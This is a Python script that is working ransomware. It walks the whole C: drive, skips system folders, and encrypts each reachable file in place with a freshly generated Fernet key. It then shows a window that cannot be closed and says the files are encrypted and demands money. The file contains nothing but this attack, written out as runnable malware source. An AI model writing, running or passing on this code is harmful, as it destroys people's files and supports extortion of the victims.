import os
from cryptography.fernet import Fernet
import tkinter
from tkinter import messagebox
import threading


def create_popup():
    root = tkinter.Tk()
    root.title("Attention")
    root.geometry("300x200")

    root.protocol("WM_DELETE_WINDOW", lambda: None)

    label = tkinter.Label(root, text="Your files have been encrypted. Send me money ASAP", padx=20, pady=20)
    label.pack(expand=True)

    root.after(10000, root.destroy)
    root.mainloop()
    


root_dir = "C:\\"

def get_all_files(root_dir):
    all_files = []
    excluded_dir = [
        "System32", "Windows", "Program Files", "AppData", "ProgramData",
        "$Recycle.Bin", "System Volume Information", "Boot", "Fonts", "Logs",
        "PolicyDefinitions", "Prefetch", "System", "config", "drivers",
        "DriverStore", "Logfiles", "spool", "SysWOW64", "Temp", "WinSxS",
        "Common Files", "Default User", "Default", "Public", "Program Files (x86)"
        ]
    for dirpath, dirnames, filenames in os.walk(root_dir):
        #Exclude some directories
        dirnames[:] = [d for d in dirnames if os.path.join(dirpath, d).split(os.sep)[-1]not in excluded_dir]

        for filename in filenames:
            full_path = os.path.join(dirpath, filename)
            if full_path.endswith(("decrypter.py", "encrypter.py", "TheKey.key", "NTUSER.DAT")):
                continue
            all_files.append(full_path)
    return all_files



files = get_all_files(root_dir)
key = Fernet.generate_key()

def generate_key():
    with open("TheKey.key", "wb") as thekey:
        thekey.write(key)

def encrypt():
    fernet = Fernet(key)
    for file in files:
        try:
            with open(file, "rb") as theFile:
                contentOfFiles = theFile.read()
            #Encrypt data
            encryptedContent = fernet.encrypt(contentOfFiles)
            with open(file, "wb") as theFile:
                theFile.write(encryptedContent)
            print(f"Encrypted {file}")
        except Exception as e:
            print(f"Failed to encrypt {file}: {e}")

    pop_up_threat = threading.Thread(target=create_popup)
    pop_up_threat.start()

generate_key()
encrypt()